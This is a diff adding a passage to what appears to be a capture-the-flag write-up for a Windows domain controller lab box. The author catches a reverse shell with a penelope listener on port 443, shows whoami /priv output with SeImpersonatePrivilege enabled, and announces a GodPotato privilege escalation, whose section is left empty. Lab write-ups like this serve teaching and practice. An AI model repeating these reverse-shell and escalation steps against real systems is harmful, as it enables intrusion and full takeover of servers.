@@ -726,6 +726,37 @@ Now i can upload this by navigating to `Apps -> Manage Apps` then i can install 
 Once the app uploads ill do a restart and a second later i get a shell!
 
 ```python
+penelope -p 443
+[+] Listening for reverse shells on 0.0.0.0:443 -> 127.0.0.1 • 192.168.1.157 • 10.10.15.69
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] => DC01 10.129.232.50 Microsoft_Windows_Server_2022_Standard-x64-based_PC 👤 haze\alexander.green 😍️ Session ID <1>
+[+] Added readline support...
+[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
+[+] Session log: /home/kali/.penelope/sessions/DC01~10.129.232.50-Microsoft_Windows_Server_2022_Standard-x64-based_PC/2026_06_08-18_52_13-373.log
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+PS C:\Windows\system32> whoami
+haze\alexander.green
+PS C:\Windows\system32> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+PS C:\Windows\system32>
+```
+I also have `SeImpersonatePrivilege`
+
+So i can just upload GodPotato
+
+## Uploading GodPotato
+
+```python
 
 ```
 
